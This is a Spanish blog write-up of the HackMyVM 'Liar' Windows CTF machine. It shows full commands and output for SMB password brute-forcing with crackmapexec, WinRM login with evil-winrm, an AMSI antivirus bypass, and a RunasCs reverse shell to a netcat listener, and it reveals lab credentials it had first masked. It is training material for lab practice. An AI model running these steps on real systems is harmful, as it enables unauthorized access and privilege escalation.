---
layout: single
title: Liar (Windows) Writeup
excerpt: "Hola a todos, hoy les presentaré la resolución de una máquina HackMyVM de dificultad Easy. En esta máquina aprenderemos a enumerar y explotar el servicio SMB, y también a utilizar WinRM para obtener acceso remoto en el sistema Windows, una vez que tengamos las credenciales correctas."


date: 2025-04-12
classes: wide
header:
  teaser: /assets/images/2025-04-13-HackMyVM-Lia-easy/2.png
  teaser_home_page: true
categories:
  - HackMyVM
  - Pentesting
  - CTF
tags:
  - Reconocimiento
  - SMB
  - WinRM
  - HackMyVM
---
![](/assets/images/2025-04-13-HackMyVM-Lia-easy/2.png)

Hola a todos, hoy les presentaré la resolución de una máquina HackMyVM de dificultad Easy. En esta máquina aprenderemos a enumerar y explotar el servicio SMB, y también a utilizar WinRM para obtener acceso remoto en el sistema Windows, una vez que tengamos las credenciales correctas.
<br>

## Reconocimiento de la Red Local

  El primer paso será enumerar los dispositivos de la red para encontrar la máquina vulnerable.

  En este caso usaremos **arp-scan** con ```-I``` especificaremos la interfaz que queremos escanear y con el ```ignoredups``` ignoraremos las entradas duplicadas . Tambien con ```2>/dev/null``` mandaremos los errores al ```/dev/null``` para que no sean visibles en la terminal. Por ultimo filtraremos por la mac que tenga ```08:00:27``` ya que este tipo de MAC son de la interfaz de red utilizadas por máquinas virtuales.

  ```ruby
  ┌──(root㉿kali)-[/home/user]
  └─# arp-scan -I eth2 --localnet --ignoredups 2>/dev/null | grep '08:00:27'      

  Interface: eth2, type: EN10MB, MAC: 08:00:27:db:40:5e, IPv4: 192.168.56.101
  192.168.56.100  08:00:27:5d:05:f2       (Unknown)
  192.168.56.102  08:00:27:53:f6:85       (Unknown)

  ```

# Reconocimiento
- Enumeración con nmap
    Hacemos un `nmap` simple para ver los puertos que corren en la máquina
    
    ```ruby
      #nmap -p- -sS --min-rate 5000 -T5 -Pn -vvv -oN ports.txt 192.168.56.102
      Warning: 192.168.56.102 giving up on port because retransmission cap hit (2).
      Increasing send delay for 192.168.56.102 from 0 to 5 due to 10452 out of 26129 dropped probes since last increase.
      Nmap scan report for 192.168.56.102
      Host is up, received arp-response (0.0018s latency).
      Scanned at 2025-04-13 13:34:49 CEST for 30s
      Not shown: 60297 closed tcp ports (reset), 5226 filtered tcp ports (no-response)
      PORT      STATE SERVICE      REASON
      80/tcp    open  http         syn-ack ttl 128
      135/tcp   open  msrpc        syn-ack ttl 128
      139/tcp   open  netbios-ssn  syn-ack ttl 128
      445/tcp   open  microsoft-ds syn-ack ttl 128
      5985/tcp  open  wsman        syn-ack ttl 128
      47001/tcp open  winrm        syn-ack ttl 128
      49664/tcp open  unknown      syn-ack ttl 128
      49665/tcp open  unknown      syn-ack ttl 128
      49666/tcp open  unknown      syn-ack ttl 128
      49667/tcp open  unknown      syn-ack ttl 128
      49668/tcp open  unknown      syn-ack ttl 128
      49671/tcp open  unknown      syn-ack ttl 128
      MAC Address: 08:00:27:53:F6:85 (Oracle VirtualBox virtual NIC)

      Read data files from: /usr/bin/../share/nmap
    ```
    En este caso podemos ver bastantes puertos , pero los que más nos llaman la atención son el 
    ```ruby
      80	HTTP	Servicio web
      135	MSRPC	Llamadas remotas
      139	NetBIOS Servicio de sesiones
      445	SMB	Compartición de archivos
      5985	WinRM	PowerShell remoto vía HTTP
      47001	WinRM (HTTPS)	PowerShell remoto vía HTTPS
    ```

# Ahora accedemos a la web para poder determinar qué tipo de vulnerabilidades podemos encontrar
  Vemos que hay algo que nos llama la atención **nica** (un usuario) 
  ![Untitled](/assets/images/2025-04-13-HackMyVM-Lia-easy/1.png)


## Reconocimiento SMB

  Ya que tenemos el SMB habilitado podemos intentar hacer un ataque de fuerza bruta en el servidor SMB ya que tenemos un usuario posiblemente valido

  Primero haremos un reconocimiento para ver a qué nos enfrentamos

  ```ruby
    ┌──(root㉿kali)-[/home/user]
    └─# creackmapexec smb 192.168.56.102
      SMB   192.168.56.102  445    WIN-IURF14RBVGV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-IURF14RBVGV) (domain:WIN-IURF14RBVGV) (signing:False) (SMBv1:False)

  ```
  Podemos observar cosas bastante interesantes como:

  **WIN-IURF14RBVGV**	Nombre del host de la máquina (NetBIOS name).

  **(domain:WIN-IURF14RBVGV)** No pertenece a un dominio externo, solo a su propio grupo de trabajo.

  **(signing:false)**	La firma de paquetes SMB está desactivada, lo cual nos permite hacer, Fuerza bruta, Pass-the-Hash...


## Intento de session nula SMB

  Podríamos intentar listar recursos con una sesión nula
  ```ruby
    ┌──(root㉿kali)-[/home/user]
    └─# crackmapexec smb 192.168.56.102 -u null -p '' --shares
      SMB   192.168.56.102  445    WIN-IURF14RBVGV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-IURF14RBVGV) (domain:WIN-IURF14RBVGV) (signing:False) (SMBv1:False)

    SMB   192.168.56.102  445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\null: STATUS_LOGON_FAILURE
  ```
  Por lo que podemos observar, listar recusos con session **nula** no deja 

## Fuerza bruta al recurso SMB con el usuario "nica"

  Una vez hecho esto , intentaremos hacer un ataque de fuerza bruta al recurso SMB con el usuario encontrado anteriormente **nica**


```ruby
  ┌──(root㉿kali)-[/home/user]
  └─# crackmapexec smb 192.168.56.102 -u nica -p /usr/share/wordlists/rockyou.txt
    SMB         192.168.56.102  445    WIN-IURF14RBVGV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-IURF14RBVGV) (domain:WIN-IURF14RBVGV) (signing:False) (SMBv1:False)
    SMB   192.168.56.102  445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:123456 STATUS_LOGON_FAILURE
    SMB   192.168.56.102  445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:12345 STATUS_LOGON_FAILURE
    SMB   192.168.56.102  445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:123456789 STATUS_LOGON_FAILURE
    SMB   192.168.56.102  445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:password STATUS_LOGON_FAILURE
    SMB   192.168.56.102  445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\nica:realizar STATUS_LOGON_FAILURE
    SMB   192.168.56.102  445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:h****
```
  Hemos obtenido la contraseña ```h*****``` despues de realizar el ataque de fuerza brut !


## Recursos compartidos

  ```ruby
    ┌──(root㉿kali)-[/home/user]
    └─$ crackmapexec smb 192.168.56.102 -u nica -p hardcore --shares
    SMB         192.168.56.102   445    WIN-IURF14RBVGV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-IURF14RBVGV) (domain:WIN-IURF14RBVGV) (signing:False) (SMBv1:False)

    SMB   192.168.56.102   445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore
    SMB   192.168.56.102   445    WIN-IURF14RBVGV  [+] Enumerated shares
    SMB   192.168.56.102   445    WIN-IURF14RBVGV  Share     Permissions     Remark
    SMB   192.168.56.102   445    WIN-IURF14RBVGV  -----     -----------     ------
    SMB   192.168.56.102   445    WIN-IURF14RBVGV  ADMIN$              Admin remota
    SMB   192.168.56.102   445    WIN-IURF14RBVGV  C$            Recurso predeterminado
    SMB   192.168.56.102   445    WIN-IURF14RBVGV  IPC$            READ            IPC remota
  ```

### Vemnos que hay varios recursos compartidos

  **1. ADMIN$:** Recurso para administración remota (por defecto, los administradores pueden acceder a él).

  **2. C$:** Recurso predeterminado que da acceso a la unidad C del sistema 

  **3. IPC$:**  proporciona un mecanismo de comunicación entre procesos (IPC) autenticado .Permite realizar conexiones remotas con otros servicios, pero tiene permisos de solo lectura.

  Veremos los recursos compartidos por defecto, por lo que no nos sirve de mucho, pero vamos a probar a conectarnos de forma remota con las credenciales que hemos encontrado, mediante el protocolo **WinRM**.

# WinRM (Windows Remote Management) 


  ```ruby
    ┌──(root㉿kali)-[/home/user]
    └─$ crackmapexec winrm 192.168.56.102 -u nica -p hardcore
    SMB    192.168.56.102   5985   WIN-IURF14RBVGV  [*] Windows 10 / Server 2019 Build 17763 (name:WIN-IURF14RBVGV) (domain:WIN-IURF14RBVGV)
    HTTP    192.168.56.102   5985   WIN-IURF14RBVGV  [*] http://192.168.56.102:5985/wsman
    WINRM  192.168.56.102   5985   WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\nica:hardcore (Pwn3d!)
  ```

  Vemos que ha funccionado! nos sale **WIN-IURF14RBVGV\nica:hardcore (Pwn3d!)**

  (Pwn3d!) → TOTAL. Has autenticado y tienes acceso remoto mediante WinRM.

Una vez hemos verificado que podemos conectarnos accederemos remotamente **usando evil-winrm**

## Evil-winrm

Podemos simplemente conectarnos usando **Evil-WinRM** y obtener una **PowerShell** como el usuario nica.

  ```ruby
  ┌──(root㉿kali)-[/home/user]
  └─$ evil-winrm -i 192.168.56.102 -u nica -p hardcore

    Evil-WinRM shell v3.7

    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

    Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

    Info: Establishing connection to remote endpoint
    *Evil-WinRM* PS C:\Users\nica\Documents> whoami
    win-iurf14rbvgv\nica
  ```
  En este punto podemos leer la primera flag con dicho usuario

  ```ruby

  *Evil-WinRM* PS C:\Users\nica> ls

  Directorio: C:\Users\nica

    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    d-r---        9/15/2018   9:12 AM                Desktop
    d-r---        9/26/2023   6:44 PM                Documents
    d-r---        9/15/2018   9:12 AM                Downloads
    d-r---        9/15/2018   9:12 AM                Favorites
    d-r---        9/15/2018   9:12 AM                Links
    d-r---        9/15/2018   9:12 AM                Music
    d-r---        9/15/2018   9:12 AM                Pictures
    d-----        9/15/2018   9:12 AM                Saved Games
    d-r---        9/15/2018   9:12 AM                Videos
    -a----        9/26/2023   6:44 PM             10 user.txt
      
  *Evil-WinRM* PS C:\Users\nica> cat user.txt
   H******
  ```
  Ahora podemos observar varias cosas, pero en lo que nos centraremos es en que hay un usuario administrador llamado **akanksha.**

  ```ruby
  *Evil-WinRM* PS C:\Users\nica> net users

  Cuentas de usuario de \\

  -------------------------------------------------------------------------------
  Administrador            akanksha                 DefaultAccount
  Invitado                 nica                     WDAGUtilityAccount
  El comando se ha completado con uno o m s errores.
  ```
# Flag de root

  Una vez sabemos que el usuario administrador es **akanksha** hacemos fueza bruta como antes

  ```ruby
 
    ┌──(root㉿kali)-[/home/user]
    └─$ # crackmapexec smb 192.168.56.102 -u akanksha -p /usr/share/wordlists/rockyou.txt
    SMB         192.168.56.102   445    WIN-IURF14RBVGV  [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN-IURF14RBVGV) (domain:WIN-IURF14RBVGV) (signing:False) (SMBv1:False)
    SMB         192.168.56.102   445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:jessica STATUS_LOGON_FAILURE
    SMB         192.168.56.102   445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:michelle STATUS_LOGON_FAILURE
    SMB         192.168.56.102   445    WIN-IURF14RBVGV  [-] WIN-IURF14RBVGV\akanksha:tigger STATUS_LOGON_FAILURE
    SMB         192.168.56.102   445    WIN-IURF14RBVGV  [+] WIN-IURF14RBVGV\akanksha:sw****
  ```
  Ya hemos encontrado la contraseña, pero...

  Aunque esta contraseña es válida para el servicio SMB, no lo es para WinRM, así que debemos pensar en otra forma de entrar.


  Ya que tenemos una shell, podríamos pensar en usar **runas**, pero nuestra shell no es interactiva, por lo que podríamos importar el módulo de [**RunasCs**](https://github.com/antonioCoco/RunasCs) para solucionar ese problema.


## Qué es runas?
  Es un comando de la línea de sistemas operativos Microsoft Windows que permite a un usuario ejecutar herramientas y programas específicos bajo un nombre de usuario diferente al que utilizó para iniciar sesión en una computadora de forma interactiva


## Qué es RunasCs ?
  RunasCs es una herramienta escrita en C# que simula el comportamiento de runas, pero:

  1. No necesita interacción directa.
  2. Puedes pasarle el usuario y la contraseña directamente por línea de comandos.
  3. Ejecuta comandos como otro usuario desde la shell remota.



  Nos descargamos **RunasCs**
  ```ruby
  
    ┌──(root㉿kali)-[/home/user]
    └─# git clone https://github.com/antonioCoco/RunasCs.git
    Cloning into 'RunasCs'...
    remote: Enumerating objects: 371, done.
    remote: Counting objects: 100% (206/206), done.
    remote: Compressing objects: 100% (108/108), done.
    remote: Total 371 (delta 131), reused 145 (delta 98), pack-reused 165 (from 1)
    Receiving objects: 100% (371/371), 331.19 KiB | 36.00 KiB/s, done.
    Resolving deltas: 100% (231/231), done.
  
   ```
  Una vez finalizada la instalación del repositorio, nos conectaremos como el usuario **nica** e importaremos **RunasCs** 


  Pero antes, nos pondremos en escucha en el puerto **4444**:
  
  ```ruby
      ┌──(root㉿kali)-[/home/user]
      └─# nc -nlvp 4444
      listening on [any] 4444 ...
  ```

  Ahora ya podemos conectarnos como el usuario **nica**

  ```ruby

    ┌──(root㉿kali)-[/home/user]
    └─# evil-winrm -i 192.168.56.102 -u nica -p hardcore

    *Evil-WinRM* PS C:\Users\nica\Documents> upload /home/user/Invoke-RunasCs.ps1

    Info: Uploading /home/user/Invoke-RunasCs.ps1 to C:\Users\nica\Documents\Invoke-RunasCs.ps1

    Data: 117712 bytes of 117712 bytes copied

    Info: Upload successful!
    
    *Evil-WinRM* PS C:\Users\nica\Documents>

   ```

  Si intentamos importar el modulo de Invoke-RunasCs.ps1 nos lo bloquea el antivirus.

  AMSI (Antimalware Scan Interface) es una protección mejorada de Windows que analiza scripts y bloquea los que contienen firmas conocidas de malware.
 
  Para evitar esto, entraremos a esta web y generar un bypass personalizado: [**AMSI-Bypass-Generator**](https://d1se0.github.io/AMSI-Bypass-Generator/index.html) 
  
   
  
  El bypass que crearás con esta web lo que hace es Desactiva AMSI en memoria

  Una vez desactivado el AMSI ya podemos importar los módulos de Invoke-RunasCs.ps1

  ```ruby

  *Evil-WinRM* PS C:\Users\nica\Documents> import-module ./Invoke-RunasCs.ps1
  ```
  Ahora nos conectaremos remotamente 
 
  ```ruby
    *Evil-WinRM* PS C:\Users\nica\Documents> invoke-RunasCs akanksha sweetgirl powershell -remote 192.168.56.101:4444

    [+] Running in session 0 with process function CreateProcessWithLogonW()
    [+] Using Station\Desktop: Service-0x0-503d31$\Default
    [+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 2788 created in background.
    *Evil-WinRM* PS C:\Users\nica\Documents>
  ```

  Si bien recordamos, anteriormente nos pusimos en escucha por el 4444 con **nc -nlvp**, si nos dirigimos a la terminal vemos que tenemos acceso al usuario **akanksha** y podemos listar los grupos a los cuales pertenece dicho usuario

  ```ruby
    nc -nlvp 4444
      listening on [any] 4444 ...
      connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 49775
      Windows PowerShell
      Copyright (C) Microsoft Corporation. Todos los derechos reservados.


      PS C:\Windows\system32> whoami /groups
      whoami /groups

      INFORMACION DE GRUPO
      --------------------

      Nombre de grupo                              Tipo           SID                                            Atributos
      ============================================ ============== ============================================== ========================================================================
      Todos                                        Grupo conocido S-1-1-0                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
      WIN-IURF14RBVGV\Idministritirs               Alias          S-1-5-21-2519875556-2276787807-2868128514-1002 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
      BUILTIN\Usuarios                             Alias          S-1-5-32-545                                   Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
      NT AUTHORITY\INTERACTIVE                     Grupo conocido S-1-5-4                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
      INICIO DE SESION EN LA CONSOLA               Grupo conocido S-1-2-1                                        Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
      NT AUTHORITY\Usuarios autentificados         Grupo conocido S-1-5-11                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
      NT AUTHORITY\Esta compañia                   Grupo conocido S-1-5-15                                       Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
      NT AUTHORITY\Cuenta local                    Grupo conocido S-1-5-113                                      Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
      NT AUTHORITY\AutenticaciOn NTLM              Grupo conocido S-1-5-64-10                                    Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado
      Etiqueta obligatoria\Nivel obligatorio medio Etiqueta       S-1-16-8192
      PS C:\Windows\system32>

  ```

  Vemos diferentes grupos pero el que Nos llama más la atención es  ``WIN-IURF14RBVGV\Idministritirs Alias S-1-5-21-2519875556-2276787807-2868128514-1002 Grupo obligatorio, Habilitado de manera predeterminada, Grupo habilitado`` es el grupo de administradores. Aunque está mal escrito, tiene los mismos permisos que el grupo de administradores de Windows.

  Lo cual nos permitiria entrar en la carpeta del Administrador y ver la flag de root

  ```ruby
  PS C:\Windows\system32> cd C:\Users\Administrador\
    root.txt
  ```

# Finalización 
  Espero que hayan aprendido mucho haciendo esta máquina y les haya servido de ayuda mi explicación para poder entender esta **CTF**. Muchas gracias por leer el artículo y no olviden seguirme en <a href="https://github.com/0x832/">GitHub</a>, ya que también iré subiendo herramientas de hacking.
